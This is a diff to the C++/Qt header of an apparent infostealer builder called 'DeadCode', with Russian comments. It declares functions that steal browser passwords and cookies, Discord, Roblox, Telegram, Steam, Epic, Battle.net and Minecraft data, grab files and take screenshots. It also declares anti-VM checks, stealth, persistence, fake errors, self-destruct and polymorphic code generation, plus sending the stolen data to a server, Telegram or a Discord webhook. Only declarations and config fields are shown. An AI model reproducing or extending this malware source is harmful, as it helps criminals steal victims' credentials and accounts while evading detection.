@@ -24,6 +24,8 @@
 #include <QPushButton>
 #include <QAction>
 #include <QMutex>
+#include <QHttpMultiPart> // Добавлено для отправки данных в Telegram и Discord
+#include <QApplication>   // Добавлено для использования QApplication в main()
 #include <array>
 #include <random>
 #include <sstream>
@@ -33,6 +35,7 @@
 #include <string>
 #include <fstream>
 #include <thread>
+#include <regex>          // Добавлено для поиска токенов Discord и Roblox
 #include <windows.h>
 #include <bcrypt.h>
 #include <sqlite3.h>
@@ -41,6 +44,7 @@
 #include <shlwapi.h>
 #include <tlhelp32.h>
 #include <psapi.h>
+#include <gdiplus.h>      // Добавлено для работы со скриншотами через GDI+
 
 QT_BEGIN_NAMESPACE
 namespace Ui { class MainWindow; }
@@ -48,6 +52,22 @@ QT_END_NAMESPACE
 
 // Объявляем глобальную переменную как extern
 extern class MainWindow* g_mainWindow;
+
+// Внешние функции, используемые в main.cpp (предполагается, что они определены в других файлах)
+extern std::string GetCustomSystemInfo(); // Получение системной информации
+extern std::string StealChromiumData(const std::string& browser, const std::string& path, const std::string& dir); // Кража данных Chromium
+extern std::string StealUnsavedBrowserData(const std::string& browser, const std::string& cachePath); // Кража несохраненных данных браузера
+extern std::string StealAppCacheData(const std::string& appName, const std::string& dir); // Кража кэша приложения
+extern std::string CaptureWebSocketSessions(const std::string& processName); // Захват WebSocket сессий
+extern std::string CaptureWebRTCSessions(const std::string& processName); // Захват WebRTC сессий
+extern std::string EncryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt); // Шифрование данных
+extern bool AntiAnalysis(); // Проверка на запуск в виртуальной машине
+extern void Stealth(); // Включение скрытного режима
+extern void Persist(); // Обеспечение персистентности
+extern void FakeError(); // Показ фейковой ошибки
+extern void SelfDestruct(); // Самоуничтожение
+extern std::string GeneratePolymorphicCode(); // Генерация полиморфного кода
+extern bool CheckVirtualEnvironment(); // Проверка на виртуальную машину
 
 class MainWindow : public QMainWindow
 {
@@ -94,13 +114,13 @@ public:
         bool persist = false;              // Включение персистентности
         bool selfDestruct = false;         // Включение самоуничтожения
         bool encryptData = false;          // Включение шифрования данных
-        bool sendToServer = true;          // Включение отправки на сервер (ДОБАВЛЕНО)
-        bool sendToTelegram = true;        // Включение отправки в Telegram (ДОБАВЛЕНО)
-        bool sendToDiscord = true;         // Включение отправки в Discord (ДОБАВЛЕНО)
+        bool sendToServer = true;          // Включение отправки на сервер
+        bool sendToTelegram = true;        // Включение отправки в Telegram
+        bool sendToDiscord = true;         // Включение отправки в Discord
         std::string sendMethod = "Local File";  // Метод отправки данных (Telegram, Discord, Local File)
         std::string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
-        std::string telegramToken = "";         // Токен для Telegram
-        std::string chatId = "";                // Chat ID для Telegram
+        std::string telegramToken = "";         // Токен для Telegram (устарело, используется telegramBotToken)
+        std::string chatId = "";                // Chat ID для Telegram (устарело, используется telegramChatId)
         std::string discordWebhook = "";        // Вебхук для Discord
         std::string filename = "DeadCode.exe";  // Имя выходного файла
         std::string encryptionKey1 = "";        // Первый ключ шифрования
@@ -111,8 +131,8 @@ public:
         std::string githubRepo = "";            // Репозиторий GitHub
         std::string uploadUrl = "http://example.com/upload"; // URL для отправки данных
         std::string serverUrl = "";             // URL сервера для отправки данных
-        std::string telegramBotToken = "";      // Токен бота Telegram (ДОБАВЛЕНО для совместимости)
-        std::string telegramChatId = "";        // Chat ID Telegram (ДОБАВЛЕНО для совместимости)
+        std::string telegramBotToken = "";      // Токен бота Telegram
+        std::string telegramChatId = "";        // Chat ID Telegram
     } config;
 
     // UI элементы
@@ -148,6 +168,7 @@ public:
     QCheckBox* silentCheckBox;             // Чекбокс для включения тихого режима
     QCheckBox* autoStartCheckBox;          // Чекбокс для включения автозапуска
     QCheckBox* persistCheckBox;            // Чекбокс для включения персистентности
+    QCheckBox* selfDestructCheckBox;       // Чекбокс для включения самоуничтожения (добавлено для соответствия main.cpp)
     QTextEdit* textEdit;                   // Текстовое поле для отображения логов
     QPushButton* iconBrowseButton;         // Кнопка для выбора иконки
     QPushButton* buildButton;              // Кнопка для запуска сборки
@@ -162,9 +183,10 @@ public:
 
     // Векторы для хранения собранных данных (используются в StealAndSendData)
     std::string collectedData;             // Текстовые данные
-    std::vector<std::string> filesToSend;  // Файлы для отправки
+    std::vector<std::string> collectedFiles; // Файлы для отправки (добавлено для соответствия main.cpp)
+    std::vector<std::string> filesToSend;  // Файлы для отправки (оставлено для совместимости, но не используется в main.cpp)
 
-    // Публичный метод StealAndSendData (перенесено из private в public)
+    // Публичный метод StealAndSendData
     void StealAndSendData(const std::string& tempDir); // Основная функция кражи и отправки данных
 
 signals:
@@ -174,6 +196,10 @@ signals:
 public slots:
     // Слоты для процесса кражи и отправки данных
     void sendData(const QString& encryptedData, const std::vector<std::string>& files); // Отправка данных
+    void sendDataToServer(const std::string& data, const std::vector<std::string>& files); // Отправка данных на сервер
+    void sendToTelegram(const std::string& data, const std::vector<std::string>& files); // Отправка данных в Telegram
+    void sendToDiscord(const std::string& data, const std::vector<std::string>& files);  // Отправка данных в Discord
+    void replyFinished(QNetworkReply *reply); // Обработчик завершения сетевого запроса
 
 private slots:
     // Слоты для генерации кода и файлов
@@ -188,34 +214,27 @@ private slots:
 
     // Слоты для процесса кражи и отправки данных
     void startStealProcess();               // Запуск процесса кражи данных после успешной сборки
-    std::string takeScreenshot(const std::string& dir); // Создание скриншота (изменено на std::string)
-    std::string collectSystemInfo(const std::string& dir); // Сбор системной информации (изменено на std::string)
+    std::string TakeScreenshot(const std::string& dir); // Создание скриншота
     std::string stealBrowserData(const std::string& dir); // Кража данных браузера (пароли, куки)
-    void stealDiscordTokens();              // Кража токенов Discord
-    std::string stealDiscordData(const std::string& dir); // Кража данных Discord (токены, история чатов)
-    std::string stealTelegramData(const std::string& dir); // Кража данных Telegram (история чатов)
-    std::string stealSteamData(const std::string& dir);   // Кража данных Steam (конфиги, MA-файлы)
-    std::string stealEpicData(const std::string& dir);    // Кража данных Epic Games
-    std::string stealRobloxData(const std::string& dir);  // Кража данных Roblox
-    std::string stealBattleNetData(const std::string& dir); // Кража данных Battle.net
-    std::string stealMinecraftData(const std::string& dir); // Кража данных Minecraft
+    std::string StealDiscordTokens(const std::string& dir); // Кража токенов Discord (исправлено объявление)
+    std::string StealTelegramData(const std::string& dir); // Кража данных Telegram (исправлено объявление)
+    std::string StealSteamData(const std::string& dir);   // Кража данных Steam (исправлено объявление)
+    std::string StealEpicGamesData(const std::string& dir); // Кража данных Epic Games (исправлено объявление)
+    std::string StealRobloxData(const std::string& dir);  // Кража данных Roblox (исправлено объявление)
+    std::string StealBattleNetData(const std::string& dir); // Кража данных Battle.net (исправлено объявление)
+    std::string StealMinecraftData(const std::string& dir); // Кража данных Minecraft (исправлено объявление)
+    std::vector<std::string> GrabFiles(const std::string& dir); // Кража файлов (граббер) (исправлено объявление)
     std::string stealChatHistory(const std::string& dir); // Кража истории чатов
-    std::vector<std::string> stealFiles(const std::string& dir); // Кража файлов (граббер) (изменено на std::vector<std::string>)
     std::string collectSocialEngineeringData(const std::string& dir); // Сбор данных для социальной инженерии
-    std::string archiveData(const std::string& dir, const std::vector<std::string>& files); // Архивация данных (изменено)
-    std::string encryptData(const std::string& data); // Шифрование данных (изменено)
-    std::string decryptData(const std::string& encryptedData); // Дешифрование данных (изменено)
-    void sendToTelegram(const std::string& data, const std::vector<std::string>& files); // Отправка данных в Telegram (изменено)
-    void sendToDiscord(const std::string& data, const std::vector<std::string>& files);  // Отправка данных в Discord (изменено)
-    void saveToLocalFile(const std::string& data, const std::string& dir); // Сохранение данных в локальный файл (изменено)
-    void sendDataToServer(const std::string& data, const std::vector<std::string>& files); // Отправка данных на сервер (ДОБАВЛЕНО)
+    std::string archiveData(const std::string& dir, const std::vector<std::string>& files); // Архивация данных
+    std::string encryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt); // Шифрование данных (исправлено объявление)
+    std::string decryptData(const std::string& encryptedData); // Дешифрование данных
+    void saveToLocalFile(const std::string& data, const std::string& dir); // Сохранение данных в локальный файл
 
     // Слоты для управления конфигурацией и логами
-    void saveConfig(const QString& fileName = QString()); // Сохранение конфигурации
+    void saveConfig();                     // Сохранение конфигурации (удалён параметр fileName, так как он не используется в main.cpp)
     void loadConfig();                     // Загрузка конфигурации
     void exportLogs();                     // Экспорт логов в файл
-    void exitApp();                        // Выход из приложения
-    void showAbout();                      // Отображение информации о программе
     void appendLog(const QString& message);  // Добавление сообщения в лог
 
     // Слоты для дополнительных функций
@@ -228,12 +247,6 @@ private slots:
     // Слоты для обработки действий пользователя
     void on_iconBrowseButton_clicked();    // Обработчик выбора иконки
     void on_buildButton_clicked();         // Обработчик кнопки "Собрать"
-    void on_actionSaveConfig_triggered();  // Обработчик сохранения конфигурации из меню
-    void on_actionLoadConfig_triggered();  // Обработчик загрузки конфигурации из меню
-    void on_actionExportLogs_triggered();  // Обработчик экспорта логов из меню
-    void on_actionExit_triggered();        // Обработчик выхода из меню
-    void on_actionAbout_triggered();       // Обработчик "О программе" из меню
-    void replyFinished(QNetworkReply *reply); // Обработчик завершения сетевого запроса
 
 private:
     // Приватные методы
